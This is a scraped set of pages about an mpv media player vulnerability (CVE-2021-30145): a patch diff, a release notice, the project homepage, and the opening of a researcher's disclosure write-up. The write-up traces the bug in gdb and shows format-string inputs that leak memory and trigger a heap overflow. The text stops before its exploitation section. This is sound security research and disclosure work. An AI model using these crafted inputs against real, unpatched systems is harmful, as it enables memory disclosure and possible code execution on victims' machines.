|  |  | goto exit\_mf; |
|  |  | } |
|  |  |  |
|  |  | mp\_info(log, "search expr: %s\n", filename); |
|  |  |  |
|  |  | while (error\_count < 5) { |
|  |  | sprintf(fname, filename, count++); |
|  |  | if (snprintf(fname, fname\_avail, filename, count++) >= fname\_avail) { |
|  |  | mp\_err(log, "format result too long: '%s'\n", filename); |
|  |  | goto exit\_mf; |
|  |  | } |
|  |  | if (!mp\_path\_exists(fname)) { |
|  |  | error\_count++; |
|  |  | mp\_verbose(log, "file not found: '%s'\n", fname); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `d0c5309`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpv-player%2Fmpv%2Fcommit%2Fd0c530919d8cd4d7a774e38ab064e0fabdae34e6) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from devel0pment.de_f56e1a4b_20250115_113124.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: formatstring

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
## [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from github.com_50f74b3d_20250114_184646.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpv-player%2Fmpv%2Freleases%2Ftag%2Fv0.33.1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpv-player%2Fmpv%2Freleases%2Ftag%2Fv0.33.1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=mpv-player%2Fmpv)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mpv-player](/mpv-player)
/
**[mpv](/mpv-player/mpv)**
Public

* [Notifications](/login?return_to=%2Fmpv-player%2Fmpv) You must be signed in to change notification settings
* [Fork
  3k](/login?return_to=%2Fmpv-player%2Fmpv)
* [Star
   29.3k](/login?return_to=%2Fmpv-player%2Fmpv)

* [Code](/mpv-player/mpv/tree/v0.33.1)
* [Issues
  881](/mpv-player/mpv/issues)
* [Pull requests
  95](/mpv-player/mpv/pulls)
* [Discussions](/mpv-player/mpv/discussions)
* [Actions](/mpv-player/mpv/actions)
* [Wiki](/mpv-player/mpv/wiki)
* [Security](/mpv-player/mpv/security)
* [Insights](/mpv-player/mpv/pulse)

Additional navigation options

* [Code](/mpv-player/mpv/tree/v0.33.1)
* [Issues](/mpv-player/mpv/issues)
* [Pull requests](/mpv-player/mpv/pulls)
* [Discussions](/mpv-player/mpv/discussions)
* [Actions](/mpv-player/mpv/actions)
* [Wiki](/mpv-player/mpv/wiki)
* [Security](/mpv-player/mpv/security)
* [Insights](/mpv-player/mpv/pulse)

1. [Releases](/mpv-player/mpv/releases)
2. [v0.33.1](/mpv-player/mpv/releases/tag/v0.33.1)

# v0.33.1

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/mpv-player/mpv/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.33.1)

 Loading

[View all tags](/mpv-player/mpv/tags)

![@sfan5](https://avatars.githubusercontent.com/u/1042418?s=40&v=4)
[sfan5](/sfan5)
released this
05 Apr 16:50

·
[4666 commits](/mpv-player/mpv/compare/v0.33.1...master)
to master
since this release

[v0.33.1](/mpv-player/mpv/tree/v0.33.1)

This tag was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/1042418?s=64&v=4)](/sfan5)
[sfan5](/sfan5)

GPG key ID: 8D769208D5E31419

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`b5d3e43`](/mpv-player/mpv/commit/b5d3e43198b9d57af5620b63537885aaa41fa8cd)

This commit was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/1042418?s=64&v=4)](/sfan5)
[sfan5](/sfan5)

GPG key ID: 8D769208D5E31419

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

Security fix release for the 0.33 branch. Users are advised to upgrade immediately.

# Fixes and Minor Enhancements

* demux\_mf: improve format string processing (assigned [CVE-2021-30145](https://github.com/advisories/GHSA-mf25-jq7f-vx34 "CVE-2021-30145"))

 Assets
2

 Loading

 👍
25
 unvermuthet, BepBop, GustavoTF25, tyf2018, yugoslavia4ever, hgh086, piyushgarg, hooke007, Edwin-Zarco, b01o, and 15 more reacted with thumbs up emoji
 😄
1
 TakuyaSama reacted with laugh emoji
 🎉
2
 TakuyaSama and Slawa79 reacted with hooray emoji
 ❤️
1
 TakuyaSama reacted with heart emoji
 🚀
1
 TakuyaSama reacted with rocket emoji

All reactions

* 👍
  25 reactions
* 😄
  1 reaction
* 🎉
  2 reactions
* ❤️
  1 reaction
* 🚀
  1 reaction

 26 people reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from mpv.io_fe2c1aa1_20250114_184646.html ===


* [Installation](/installation)

* [Reference](/manual)
* [Bug Reports](/bug-reports)
* [Community](/community)

# mpv

a free, open source, and cross-platform media player

![Screenshot of mpv playing a movie](/images/mpv-screenshot-0935decb.png)

## Overview

mpv is a free (as in freedom) media player for the command line. It supports
a wide variety of media file formats, audio and video codecs, and subtitle types.

#### Scripting

Powerful scripting capabilities can make the player do almost anything. There is
a large selection of
[user scripts on the wiki](https://github.com/mpv-player/mpv/wiki/User-Scripts).

#### On Screen Controller

While mpv strives for minimalism and provides no real GUI, it has a small controller on top of the video
for basic control.

#### High quality video output

mpv has an OpenGL, Vulkan, and D3D11 based video output that is capable of many features
loved by videophiles, such as video scaling with popular high quality
algorithms, color management, frame timing, interpolation, HDR, and more.

#### GPU video decoding

mpv can leverage most hardware decoding APIs on all platforms. Hardware
decoding can be enabled at runtime on demand.

#### Embeddable

A straightforward
[C API](https://github.com/mpv-player/mpv/blob/master/libmpv/client.h)
was designed from the ground up to make mpv usable as a library and
facilitate easy integration into other applications.

#### Active development

mpv is under active development, focusing on code refactoring and
cleanups as well as adding features. Want a feature?
[Post a patch or request it!](https://github.com/mpv-player/mpv/issues)

## Here are a few places you may want to go next...

---

[### Installation](/installation)

[### Source Code Repository](https://github.com/mpv-player/mpv)

© 2012-2025 mpv.io



=== Content from devel0pment.de_e52d3439_20250115_113123.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217) by [scryh](https://devel0pment.de/?author=1)
# mpv media player – mf custom protocol vulnerability (CVE-2021-30145)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

---

# Introduction

I have recently started to review some popular open source software by choosing interesting projects from [GitHub’s trending page](https://github.com/trending/c?since=monthly). One of the projects I have been looking at is mpv. [mpv](https://mpv.io/) is an open source media player available for a wide variety of operating systems (Windows, macOS, Linux, …).

When searching for possibly vulnerable function calls, I came upon this suspicious call to sprintf:

`...
mp_info(log, "search expr: %s\n", filename);
while (error_count < 5) {
sprintf(fname, filename, count++);
if (!mp_path_exists(fname)) {
error_count++;
mp_verbose(log, "file not found: '%s'\n", fname);
} else {
mf_add(mf, fname);
}
}
...`

One reason for this call being suspicious is that the second parameter to sprintf (which is the format string), is called filename. This sounds pretty user controllable. Another reason is that sprintf should be avoided at all, because it does not do any boundary checks. The safer alternative is snprintf, which takes an additional argument specifying the maximum amount of bytes to write. If sprintf is used nonetheless, the calling code must ensure that the buffer is big enough to prevent a buffer overflow. My first impression was, that this is not the case here.

# Format String Vulnerability

Let’s start by verifying that we can actually control the filename variable and thus the format string passed to sprintf. The function surrounding the call is named open\_mf\_pattern (see code [here](https://github.com/mpv-player/mpv/blob/v0.33.0/demux/demux_mf.c#L59)). The third paramater of this function is the variable filename. In order to reach the call to sprintf, the following conditions have to be met:
```

- filename[0] != '@' (line 68)
- !strchr(filename, ',') (line 103)
- strchr(filename, '%') (line 127)

```

Accordingly the provided filename should not start with an at sign (@), should not contain a comma (,), but should contain at least one percent sign (%).

Keeping this in mind we need to look where open\_mf\_pattern is called from. This leads us to the function demux\_open\_mf:

`static int demux_open_mf(demuxer_t *demuxer, enum demux_check check)
{
mf_t *mf;
if (strncmp(demuxer->stream->url, "mf://", 5) == 0 && ...)
{
mf = open_mf_pattern(demuxer, demuxer, demuxer->stream->url + 5);
...`

Here we can see that if the URL of the stream being opened (demuxer->stream->url) begins with the string mf://, the function open\_mf\_pattern is called. The third parameter (filename) is set to the stream URL omitting the prefix mf://.

The demux\_open\_mf function is stored as a callback in the demuxer\_desc\_mf struct:

`const demuxer_desc_t demuxer_desc_mf = {
.name = "mf",
.desc = "image files (mf)",
.read_packet = demux_mf_read_packet,
.open = demux_open_mf,
...
};`

This struct defines callbacks for the mf demuxer, which is referenced by the corresponding stream (stream\_info\_mf struct) using the name “mf”:

`const stream_info_t stream_info_mf = {
.name = "mf",
.open = mf_stream_open,
.protocols = (const char*const[]){ "mf", NULL },
};`

When the provided protocol is set to mf:// this stream is created.

We can now verify, that we can reach the sprintf call by loading mpv in gdb and setting a breakpoint on the function call:

`user@b0x:~/opt/mpv/build$ gdb ./mpv
...
gdb-peda$ disassemble open_mf_pattern
Dump of assembler code for function open_mf_pattern:
...
0x000000000005a3c7 <+551>: mov esi,0x1
0x000000000005a3cc <+556>: add ebx,0x1
 0x000000000005a3cf <+559>: call 0x327c0 <__sprintf_chk@plt>
0x000000000005a3d4 <+564>: mov rdi,r13
0x000000000005a3d7 <+567>: call 0x95b60 <mp_path_exists>
0x000000000005a3dc <+572>: test al,al
...
gdb-peda$ b *open_mf_pattern+559
Breakpoint 1 at 0x5a3cf: file /usr/include/x86_64-linux-gnu/bits/stdio2.h, line 36.`

As we can see, the function being called is actually \_\_sprintf\_chk. Since the binary was compiled with FORTIFY\_SOURCE enabled, calls to printf, sprintf, etc. are replaced with these safer versions, which are suffixed with \_chk. The presence of this security feature is also displayed by e.g. using the gdb-peda command checksec:

`gdb-peda$ checksec
CANARY : ENABLED
FORTIFY : ENABLED
NX : ENABLED
PIE : ENABLED
RELRO : FULL`

After having set the breakpoint, we can now run mpv and provide a mf:// URL. For the URL we must ensure to meet the above mentioned criteria. For example mf://test%d:

`gdb-peda$ r mf://test%d
Starting program: /home/user/opt/mpv/build/mpv mf://test%d
...
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x1
RCX: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
RDX: 0xffffffffffffffff
RSI: 0x1
RDI: 0x7fffe40020a0 --> 0x0
RBP: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
RSP: 0x7fffebcaee00 --> 0x7fffebcaf0df --> 0x5555556b95a000
RIP: 0x5555555ae3cf (<open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>)
R8 : 0x0
R9 : 0x4
R10: 0x1
R11: 0x0
R12: 0x7fffe4002020 --> 0x7fffe4001970 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
R13: 0x7fffe40020a0 --> 0x0
R14: 0x7fffe4001970 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x5555555ae3c0 <open_mf_pattern+544>: mov rdx,0xffffffffffffffff
0x5555555ae3c7 <open_mf_pattern+551>: mov esi,0x1
0x5555555ae3cc <open_mf_pattern+556>: add ebx,0x1
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe40020a0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
arg[4]: 0x0
...`

We actually hit the breakpoint. The second (0x1) and third parameter (0xffffffffffffffff) are additional parameters introduced by replacing sprintf with \_\_sprintf\_chk. We get to these parameters soon. Aside from this we can see that the URL we provided (omitting the prefix mf://) is actually passed as the fourth parameter, which is the format string. Thus we have verified the format string vulnerability.

By running mpv with the -v option in order to increase the verbosity, we can actually see the format string vulnerability in the verbose output:

`user@b0x:~/opt/mpv/build$ ./mpv -v mf://%p.%p.%p.%p
...
[mf] Opening mf://%p.%p.%p.%p
[demux] Trying demuxers for level=request.
[mf] search expr: %p.%p.%p.%p
[mf] file not found: '(nil).0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x1.0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x2.0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x3.0x4.0x55555575ea93.0x55555575e880'
[mf] file not found: '0x4.0x4.0x55555575ea93.0x55555575e880'
[mf] number of files: 0
[cplayer] Opening failed or was aborted: mf://%p.%p.%p.%p
[cplayer] finished playback, unrecognized file format (reason 4)
[cplayer] Failed to recognize file format.
[cplayer]
[cplayer] Exiting... (Errors when loading file)`

Since we provided invalid filenames, an error message for each file is displayed, which contains the string produces via the sprintf call. The provided format specifiers (%p) are indeed evaluated.

A format string vulnerability is usually a very powerful exploitation primitive. Though without spoiling too much: FORTIFY\_SOURCE greatly reduces the possible impact. We will get to the exploitation considerations in the [exploitation section](#expl). Let’s first have a look at the additional parameters introduced by replacing sprintf with \_\_sprintf\_chk again.

# Heap Overflow

When we hit the breakpoint on \_\_sprintf\_chk, we see two additional parameters (second and third):

`...
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe40020a0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe40011f5 --> 0x642574736574 ('test%d')
arg[4]: 0x0
...`

The second parameter is called flag and has a value of 0x1. This value determines the amount of security measures \_\_sprintf\_chk should perform. For our considerations, we don’t need to dig deeper here. More interesting to notice is the third parameter, which is called strlen and determines the maximum amount of bytes the destination buffer can receive. This is similar to the additional n parameter passed to snprintf. Though in this case the value is obviously set to 0xffffffffffffffff, which effectively disables this buffer overflow protection. The reason for this is that the destination buffer was dynamically allocated on the heap. Thus the compiler could not now in advance, how big the buffer is and simply defaults it to 0xffffffffffffffff. If a static buffer is used (e.g. char buf[100]), the FORTIFY\_SOURCE option actually prevents sprintf (replaced by \_\_sprintf\_chk) from overflowing the buffer (terminating the program with the error message \*\*\* buffer overflow detected \*\*\*: terminated).

The allocation for the destination buffer called fname is also done in the open\_mf\_pattern function (see code [here](https://github.com/mpv-player/mpv/blob/v0.33.0/demux/demux_mf.c#L124)):

`...
char *fname = talloc_size(mf, strlen(filename) + 32);
...`

The size of the buffer is equal to the size of the provided filename plus additional 32 bytes. It is quite obvious that these 32 bytes are not enough, because we can provide multiple, arbitrary format specifiers and \_\_sprintf\_chk won’t prevent a buffer overflow. Let’s also verify that by setting an additional breakpoint on the allocation (talloc\_size):

`gdb-peda$ disassemble open_mf_pattern
Dump of assembler code for function open_mf_pattern:
...
0x000000000005a328 <+392>: mov rdi,rbp
0x000000000005a32b <+395>: call 0x31400 <strlen@plt>
0x000000000005a330 <+400>: mov rdi,r12
0x000000000005a333 <+403>: lea rsi,[rax+0x20]
 0x000000000005a337 <+407>: call 0x10a290 <ta_alloc_size>
0x000000000005a33c <+412>: lea rsi,[rip+0xb898c] # 0x112ccf
...
gdb-peda$ b *open_mf_pattern+407
Breakpoint 2 at 0x5a337: file ../demux/demux_mf.c, line 124.`

In order to make \_\_sprintf\_chk write a huge amount of bytes to the destination buffer, we can use a padded format specifier like %1000d:

`gdb-peda$ r mf://%1000d
Starting program: /home/user/opt/mpv/build/mpv mf://%1000d
...
[-------------------------------------code-------------------------------------]
0x5555555ae32b <open_mf_pattern+395>: call 0x555555585400 <strlen@plt>
